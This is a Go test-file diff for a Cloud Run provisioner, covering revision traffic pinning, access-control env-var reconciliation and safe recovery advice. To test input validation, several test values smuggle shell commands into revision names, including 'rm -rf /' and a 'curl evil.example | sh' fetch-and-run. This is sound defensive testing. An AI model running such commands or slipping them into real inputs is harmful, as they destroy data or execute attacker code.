@@ -12,6 +12,7 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/fullsend-ai/fullsend/internal/mintcore"
 	"github.com/fullsend-ai/fullsend/internal/mintcore/mintconsts"
@@ -42,6 +43,12 @@ func (f roundTripFunc) RoundTrip(req *http.Request) (*http.Response, error) { re
 func newTestProvisioner(cfg Config, gcpAPI GCFClient) *Provisioner {
 	p := NewProvisioner(cfg, gcpAPI)
 	p.httpClient = healthyClient()
+	// Avoid real sleeps in tests that exercise waitForRevisionReady's poll loop.
+	p.pollDelay = func(time.Duration) <-chan time.Time {
+		ch := make(chan time.Time, 1)
+		ch <- time.Now()
+		return ch
+	}
 	return p
 }
 
@@ -285,6 +292,7 @@ func TestProvisioner_Provision_FullFlow(t *testing.T) {
 		"CreateFunction",
 		"WaitForOperation",
 		"GetFunction",
+		"GetServiceRevisionInfo",   // pin traffic to latest before registration, so registration patches the reconciled revision
 		"GetFunction",              // EnsureOrgInMint checks function metadata
 		"GetServiceTrafficEnvVars", // EnsureOrgInMint reads traffic-serving env vars (no-op after first deploy)
 		"SetCloudRunInvoker",
@@ -3077,7 +3085,7 @@ func TestEnsureOrgInMint_LowercasesOrg(t *testing.T) {
 	assert.NotContains(t, fake.lastUpdateServiceEnvVars["ALLOWED_ORGS"], "AcmeCorp")
 }
 
-func TestEnsureOrgInMint_DefaultsAllowedWorkflowFiles(t *testing.T) {
+func TestEnsureOrgInMint_DoesNotDefaultAbsentAllowedWorkflowFiles(t *testing.T) {
 	fake := newFakeGCFClient()
 	fake.functionInfo = &FunctionInfo{
 		URI: "https://mint.example.com",
@@ -3091,7 +3099,27 @@ func TestEnsureOrgInMint_DefaultsAllowedWorkflowFiles(t *testing.T) {
 	p := NewProvisioner(Config{ProjectID: "my-test-proj1", Region: "us-central1"}, fake)
 	err := p.EnsureOrgInMint(context.Background(), "https://mint.example.com", "new-org")
 	require.NoError(t, err)
-	assert.Equal(t, "*", fake.lastUpdateServiceEnvVars["ALLOWED_WORKFLOW_FILES"])
+	require.Contains(t, fake.calls, "UpdateServiceEnvVars")
+	// An absent value is the existing mint's deny-all workflow policy;
+	// registering an org must not widen it to "*".
+	assert.NotContains(t, fake.lastUpdateServiceEnvVars, "ALLOWED_WORKFLOW_FILES")
+}
+
+func TestEnsureOrgInMint_DoesNotDefaultEmptyAllowedWorkflowFiles(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.functionInfo = &FunctionInfo{
+		URI: "https://mint.example.com",
+		EnvVars: map[string]string{
+			"ALLOWED_ORGS":           "existing-org",
+			"ROLE_APP_IDS":           `{"coder":"100"}`,
+			"ALLOWED_ROLES":          "coder",
+			"ALLOWED_WORKFLOW_FILES": "",
+		},
+	}
+
+	p := NewProvisioner(Config{ProjectID: "my-test-proj1", Region: "us-central1"}, fake)
+	require.NoError(t, p.EnsureOrgInMint(context.Background(), "https://mint.example.com", "new-org"))
+	assert.Empty(t, fake.lastUpdateServiceEnvVars["ALLOWED_WORKFLOW_FILES"])
 }
 
 func TestEnsureOrgInMint_PreservesExistingAllowedWorkflowFiles(t *testing.T) {
@@ -4575,4 +4603,1093 @@ func TestDeleteWIFProvider_ProjectNumberError(t *testing.T) {
 	err := p.DeleteWIFProvider(context.Background(), "github-oidc")
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "getting project number")
+}
+
+func TestTrafficShiftCommand(t *testing.T) {
+	assert.Equal(t,
+		"gcloud run services update-traffic fullsend-mint --project=my-project --region=us-central1 --to-revisions fullsend-mint-00115-qp5=100",
+		trafficShiftCommand("my-project", "us-central1", "fullsend-mint-00115-qp5"))
+	// Unknown or invalid revisions never produce an executable command, and
+	// --to-latest is never offered.
+	for _, bad := range []string{
+		"",
+		"rev; rm -rf /",
+		"rev$(id)",
+		"rev`id`",
+		"rev name",
+		"rev\nname",
+		"rev\x1b[31m",
+		"Rev-Upper",
+		"-leading-dash",
+	} {
+		assert.Equal(t, "", trafficShiftCommand("my-project", "us-central1", bad), "revision %q", bad)
+	}
+}
+
+func TestTrafficRecoveryAdvice_InvalidRevisionOmitsCommand(t *testing.T) {
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, newFakeGCFClient())
+	good := p.trafficRecoveryAdvice("fullsend-mint-00115-qp5")
+	assert.Contains(t, good, "recover with: gcloud run services update-traffic")
+	bad := p.trafficRecoveryAdvice("rev; rm -rf /")
+	assert.NotContains(t, bad, "gcloud")
+	assert.NotContains(t, bad, "rm -rf")
+	assert.Contains(t, bad, "re-run mint deploy")
+	assert.NotContains(t, p.trafficRecoveryAdvice(""), "gcloud")
+}
+
+func TestEnsureTrafficOnLatestRevision_PinFailureWithMalformedRevisionOmitsCommand(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:       "fullsend-mint-00114-fm9",
+		LatestCreatedRevisionShort: "rev; curl evil.example | sh",
+		LatestReadyRevisionShort:   "rev; curl evil.example | sh",
+		TemplateMatchesTraffic:     false,
+		TrafficEnvVars:             map[string]string{"ALLOWED_ORGS": "test-org"},
+		TemplateEnvVars:            map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	fake.errs["PinServiceTraffic"] = fmt.Errorf("unexpected revision name format")
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.NotContains(t, err.Error(), "--to-")
+}
+
+func TestShortRevisionName(t *testing.T) {
+	assert.Equal(t, "fullsend-mint-00115-qp5", shortRevisionName("projects/p/locations/r/services/s/revisions/fullsend-mint-00115-qp5"))
+	assert.Equal(t, "fullsend-mint-00115-qp5", shortRevisionName("fullsend-mint-00115-qp5"))
+	assert.Equal(t, "", shortRevisionName(""))
+}
+
+func TestEnsureTrafficOnLatestRevision_AlreadyMatching(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00115-qp5",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   true,
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.Contains(t, fake.calls, "GetServiceRevisionInfo")
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+}
+
+func TestEnsureTrafficOnLatestRevision_PinsAheadOfReadyTemplateRevisionOnceReady(t *testing.T) {
+	// A just-finished deploy creates a new revision (LatestCreatedRevisionShort)
+	// while traffic and LatestReadyRevisionShort still point at the old
+	// revision — TemplateMatchesTraffic correctly reports divergence (see the
+	// GetServiceRevisionInfo fix comparing against the latest *created*
+	// revision, not latestReadyRevision). ensureTrafficOnLatestRevision must
+	// still confirm the new revision is Ready (via RecentRevisions) before
+	// pinning traffic to it — not skip the pin entirely.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:       "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort:   "fullsend-mint-00114-fm9",
+		LatestCreatedRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateRevision:           "projects/p/locations/r/services/s/revisions/fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:     false,
+		RecentRevisions: []RevisionSummary{
+			{Name: "fullsend-mint-00115-qp5", Active: true},
+			{Name: "fullsend-mint-00114-fm9", Active: true},
+		},
+		TrafficEnvVars:  map[string]string{"ALLOWED_ORGS": "test-org"},
+		TemplateEnvVars: map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.Contains(t, fake.calls, "PinServiceTraffic")
+	assert.Equal(t, "fullsend-mint-00115-qp5", fake.lastPinnedRevision)
+}
+
+func TestEnsureTrafficOnLatestRevision_WaitsForNotYetReadyRevisionThenPins(t *testing.T) {
+	// The newly created revision is not yet Ready on the first read (absent
+	// from RecentRevisions' Active set) but becomes Ready on a subsequent
+	// poll. ensureTrafficOnLatestRevision must wait rather than either
+	// pinning an unready revision or giving up immediately.
+	fake := newFakeGCFClient()
+	notYetReady := &ServiceRevisionInfo{
+		TrafficRevisionShort:       "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort:   "fullsend-mint-00114-fm9",
+		LatestCreatedRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:     false,
+		RecentRevisions: []RevisionSummary{
+			{Name: "fullsend-mint-00115-qp5", Active: false},
+			{Name: "fullsend-mint-00114-fm9", Active: true},
+		},
+		TrafficEnvVars:  map[string]string{"ALLOWED_ORGS": "test-org"},
+		TemplateEnvVars: map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	nowReady := &ServiceRevisionInfo{
+		TrafficRevisionShort:       "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort:   "fullsend-mint-00115-qp5",
+		LatestCreatedRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:     false,
+		RecentRevisions: []RevisionSummary{
+			{Name: "fullsend-mint-00115-qp5", Active: true},
+			{Name: "fullsend-mint-00114-fm9", Active: true},
+		},
+		TrafficEnvVars:  map[string]string{"ALLOWED_ORGS": "test-org"},
+		TemplateEnvVars: map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	// First call: initial GetServiceRevisionInfo inside ensureTrafficOnLatestRevision.
+	// Second/third calls: waitForRevisionReady's poll loop.
+	fake.revisionInfoSequence = []*ServiceRevisionInfo{notYetReady, notYetReady, nowReady}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.Contains(t, fake.calls, "PinServiceTraffic")
+	assert.Equal(t, "fullsend-mint-00115-qp5", fake.lastPinnedRevision)
+}
+
+func TestEnsureTrafficOnLatestRevision_TimesOutWaitingForNotYetReadyRevision(t *testing.T) {
+	// The newly created revision never becomes Ready within the timeout:
+	// ensureTrafficOnLatestRevision must fail with retry advice (not a manual
+	// traffic-shift command, which could restore grants revoked during the
+	// wait) rather than pinning the unready revision.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:       "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort:   "fullsend-mint-00114-fm9",
+		LatestCreatedRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:     false,
+		RecentRevisions: []RevisionSummary{
+			{Name: "fullsend-mint-00115-qp5", Active: false},
+			{Name: "fullsend-mint-00114-fm9", Active: true},
+		},
+		TrafficEnvVars:  map[string]string{"ALLOWED_ORGS": "test-org"},
+		TemplateEnvVars: map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+	p.revisionReadyTimeout = 5 * time.Millisecond
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "did not become ready")
+	assert.Contains(t, err.Error(), retryDeployAdvice)
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+}
+
+// Reconciliation derives env vars from the verified serving snapshot, so the
+// update must be conditioned on that snapshot's etag.
+func TestEnsureTrafficOnLatestRevision_ReconciliationIsConditionedOnVerifiedEtag(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		Etag:                     "etag-verified",
+		TrafficEnvVars:           map[string]string{"ALLOWED_ORGS": "test-org,other-org"},
+		TemplateEnvVars:          map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	require.NoError(t, p.ensureTrafficOnLatestRevision(context.Background(), false))
+	assert.Equal(t, []string{"etag-verified"}, fake.updateEtags)
+}
+
+// A concurrent change after the serving snapshot (e.g. a revocation) makes the
+// conditional update fail; the deploy fails with retry advice and never offers
+// a manual traffic shift to the stale target.
+func TestEnsureTrafficOnLatestRevision_ReconciliationEtagRejectionFailsWithRetryAdvice(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		Etag:                     "etag-stale",
+		TrafficEnvVars:           map[string]string{"ALLOWED_ORGS": "test-org,other-org"},
+		TemplateEnvVars:          map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	fake.errs["UpdateServiceEnvVarsIfMatch"] = fmt.Errorf("409 etag mismatch")
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "etag mismatch")
+	assert.Contains(t, err.Error(), "do not shift traffic manually")
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+}
+
+func TestEnsureTrafficOnLatestRevision_PinsWhenDiverged(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		// Traffic env vars must be a verified, non-empty read (see
+		// reconcileTargetEnvVars) and match the template here so this test
+		// exercises the "already reconciled" branch without also asserting
+		// anything about reconciliation itself.
+		TrafficEnvVars:  map[string]string{"ALLOWED_ORGS": "test-org"},
+		TemplateEnvVars: map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.Contains(t, fake.calls, "PinServiceTraffic")
+	assert.Equal(t, "fullsend-mint-00115-qp5", fake.lastPinnedRevision)
+}
+
+func TestEnsureTrafficOnLatestRevision_FallsBackToTemplateRevision(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:   "fullsend-mint-00114-fm9",
+		TemplateRevision:       "projects/p/locations/r/services/s/revisions/fullsend-mint-00116-abc",
+		TemplateMatchesTraffic: false,
+		// Confirms the fallback target (derived from TemplateRevision, since
+		// LatestCreatedRevisionShort/LatestReadyRevisionShort are both empty
+		// here) is Ready before ensureTrafficOnLatestRevision pins to it.
+		RecentRevisions: []RevisionSummary{
+			{Name: "fullsend-mint-00116-abc", Active: true},
+		},
+		TrafficEnvVars:  map[string]string{"ALLOWED_ORGS": "test-org"},
+		TemplateEnvVars: map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.Equal(t, "fullsend-mint-00116-abc", fake.lastPinnedRevision)
+}
+
+func TestEnsureTrafficOnLatestRevision_PinsWhenTrafficUnknownButLatestKnown(t *testing.T) {
+	// On an existing service, an unreported traffic-serving revision is the
+	// same "traffic env unknown" condition TrafficEnvVarsUnreliable guards
+	// below: GetServiceRevisionInfo leaves TrafficRevisionShort empty in
+	// exactly the situation where it can't resolve/read the traffic
+	// revision, so refuse to pin without verifying currently-served
+	// registration data instead of moving traffic onto latest-ready blind.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "not yet reported on an existing service")
+	// The refusal must not hand the operator the exact gcloud command it just
+	// declined to run: following it would perform the unverified pin this
+	// function exists to refuse.
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.Contains(t, err.Error(), "re-run mint deploy")
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+}
+
+func TestEnsureTrafficOnLatestRevision_FirstDeployPinsWhenTrafficUnknownButLatestKnown(t *testing.T) {
+	// On a genuine first deploy there is no prior traffic-serving revision
+	// to reconcile registration data against, so a known latest-ready
+	// revision should be pinned explicitly rather than silently trusted to
+	// waitForReady, which only checks HTTP 200 and not which revision
+	// served it.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), true)
+	require.NoError(t, err)
+	assert.Contains(t, fake.calls, "PinServiceTraffic")
+	assert.Equal(t, "fullsend-mint-00115-qp5", fake.lastPinnedRevision)
+}
+
+func TestEnsureTrafficOnLatestRevision_BothTrafficAndLatestUnknownReturnsError(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TemplateMatchesTraffic: false,
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "latest revision is unknown")
+	assert.Contains(t, err.Error(), "re-run mint deploy")
+	assert.NotContains(t, err.Error(), "--to-latest")
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+}
+
+func TestEnsureTrafficOnLatestRevision_PinErrorRecommendsRetry(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars:           map[string]string{"ALLOWED_ORGS": "test-org"},
+		TemplateEnvVars:          map[string]string{"ALLOWED_ORGS": "test-org"},
+	}
+	fake.errs["PinServiceTraffic"] = fmt.Errorf("permission denied")
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "permission denied")
+	assert.Contains(t, err.Error(), "currently serving fullsend-mint-00114-fm9")
+	// A conditional pin can fail because the service changed since it was
+	// verified; a manual traffic shift would then be unsafe, so only retry
+	// advice is offered.
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.Contains(t, err.Error(), retryDeployAdvice)
+}
+
+func TestEnsureTrafficOnLatestRevision_LookupErrorRecommendsRetry(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.errs["GetServiceRevisionInfo"] = fmt.Errorf("not found")
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "not found")
+	assert.Contains(t, err.Error(), "re-run mint deploy")
+	assert.NotContains(t, err.Error(), "--to-latest")
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+}
+
+func TestEnsureTrafficOnLatestRevision_UnknownLatestRecommendsRetry(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:   "fullsend-mint-00114-fm9",
+		TemplateMatchesTraffic: false,
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "latest revision is unknown")
+	assert.Contains(t, err.Error(), "re-run mint deploy")
+	assert.NotContains(t, err.Error(), "--to-latest")
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+}
+
+func TestEnsureTrafficOnLatestRevision_ReconcileFailureAfterRevisionCreatedGivesRetryAdvice(t *testing.T) {
+	// UpdateServiceEnvVarsIfMatch can fail after already creating a revision
+	// with the reconciled env (template update succeeded, conditional traffic
+	// pin rejected, e.g. an etag conflict from a concurrent revocation). Even
+	// though a revision name is returned, the error must give retry advice and
+	// no traffic-shift command: shifting traffic by hand to that earlier
+	// reconciled snapshot could restore grants revoked in the meantime.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org,other-org",
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+	}
+	fake.errs["UpdateServiceEnvVars"] = fmt.Errorf("traffic routing failed")
+	fake.updateServiceRevision = "fullsend-mint-00116-new"
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "traffic routing failed")
+	assert.Contains(t, err.Error(), retryDeployAdvice)
+	assert.NotContains(t, err.Error(), "recover with:")
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.NotContains(t, err.Error(), "--to-revisions")
+}
+
+func TestEnsureTrafficOnLatestRevision_ReconcileFailureWithoutRevisionDoesNotSuggestUnsafeShift(t *testing.T) {
+	// When UpdateServiceEnvVars fails without returning a revision name, no
+	// reconciled revision is identified (an empty name does not prove none
+	// was created), and the original target carries unreconciled access
+	// controls. The error must recommend retrying reconciliation and must
+	// not offer a traffic-shift command to that target.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org,other-org",
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+	}
+	fake.errs["UpdateServiceEnvVars"] = fmt.Errorf("getting Cloud Run service: transport error")
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "transport error")
+	assert.Contains(t, err.Error(), retryDeployAdvice)
+	assert.NotContains(t, err.Error(), "recover with:")
+	assert.NotContains(t, err.Error(), "gcloud run services update-traffic")
+	assert.NotContains(t, err.Error(), "--to-revisions")
+	assert.Empty(t, fake.lastPinnedRevision)
+}
+
+func TestEnsureTrafficOnLatestRevision_ReconcilesMissingOrgBeforePin(t *testing.T) {
+	// The traffic-serving revision has "other-org" registered via a direct
+	// Cloud Run patch (e.g. EnsureOrgInMint) that never reached the Cloud
+	// Functions template used to build the latest-ready revision.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org,other-org",
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	assert.Contains(t, fake.calls, "UpdateServiceEnvVars")
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	assert.Equal(t, "other-org,test-org", fake.lastUpdateServiceEnvVars["ALLOWED_ORGS"])
+}
+
+func TestEnsureTrafficOnLatestRevision_ReconcilesMissingRoleAppIDBeforePin(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ROLE_APP_IDS": `{"coder":"111","reviewer":"222"}`,
+		},
+		TemplateEnvVars: map[string]string{
+			"ROLE_APP_IDS":  `{"coder":"111"}`,
+			"ALLOWED_ROLES": "coder",
+		},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	var gotIDs map[string]string
+	require.NoError(t, json.Unmarshal([]byte(fake.lastUpdateServiceEnvVars["ROLE_APP_IDS"]), &gotIDs))
+	assert.Equal(t, map[string]string{"coder": "111", "reviewer": "222"}, gotIDs)
+	assert.Equal(t, "coder,reviewer", fake.lastUpdateServiceEnvVars["ALLOWED_ROLES"])
+}
+
+func TestEnsureTrafficOnLatestRevision_NoReconciliationWhenTargetAlreadyMatchesTraffic(t *testing.T) {
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.Contains(t, fake.calls, "PinServiceTraffic")
+	assert.NotContains(t, fake.calls, "UpdateServiceEnvVars")
+}
+
+func TestEnsureTrafficOnLatestRevision_RevokedOrgDoesNotSurvivePin(t *testing.T) {
+	// "new-org" was removed from the traffic-serving revision (e.g. via
+	// RemoveOrgFromMint) but lingers in the stale Cloud Functions template.
+	// Reconciliation must treat traffic as the source of truth and strip it,
+	// not union it forward onto the revision that is about to receive 100%
+	// of traffic.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org",
+		},
+		TemplateEnvVars: map[string]string{
+			"ALLOWED_ORGS": "test-org,new-org",
+		},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	assert.Contains(t, fake.calls, "UpdateServiceEnvVars")
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	assert.Equal(t, "test-org", fake.lastUpdateServiceEnvVars["ALLOWED_ORGS"])
+}
+
+func TestEnsureTrafficOnLatestRevision_RevokedRoleDoesNotSurvivePin(t *testing.T) {
+	// "reviewer" was removed from ROLE_APP_IDS on the traffic-serving
+	// revision but the stale template still has it. Reconciliation must
+	// copy traffic's ROLE_APP_IDS/ALLOWED_ROLES verbatim, not union the
+	// template's stale role forward.
+	fake := newFakeGCFClient()
+	fake.revisionInfo = &ServiceRevisionInfo{
+		TrafficRevisionShort:     "fullsend-mint-00114-fm9",
+		LatestReadyRevisionShort: "fullsend-mint-00115-qp5",
+		TemplateMatchesTraffic:   false,
+		TrafficEnvVars: map[string]string{
+			"ROLE_APP_IDS":  `{"coder":"111"}`,
+			"ALLOWED_ROLES": "coder",
+		},
+		TemplateEnvVars: map[string]string{
+			"ROLE_APP_IDS":  `{"coder":"111","reviewer":"222"}`,
+			"ALLOWED_ROLES": "coder,reviewer",
+		},
+	}
+	p := newTestProvisioner(Config{ProjectID: "my-project", Region: "us-central1"}, fake)
+
+	err := p.ensureTrafficOnLatestRevision(context.Background(), false)
+	require.NoError(t, err)
+	assert.NotContains(t, fake.calls, "PinServiceTraffic")
+	require.NotNil(t, fake.lastUpdateServiceEnvVars)
+	var gotIDs map[string]string
+	require.NoError(t, json.Unmarshal([]byte(fake.lastUpdateServiceEnvVars["ROLE_APP_IDS"]), &gotIDs))
+	assert.Equal(t, map[string]string{"coder": "111"}, gotIDs)
+	assert.Equal(t, "coder", fake.lastUpdateServiceEnvVars["ALLOWED_ROLES"])
+}
+
+func TestEnsureTrafficOnLatestRevision_NewlyConfiguredRoleSurvivesPin(t *testing.T) {
+	// This deploy's own config just added "reviewer" via p.cfg.AgentAppIDs
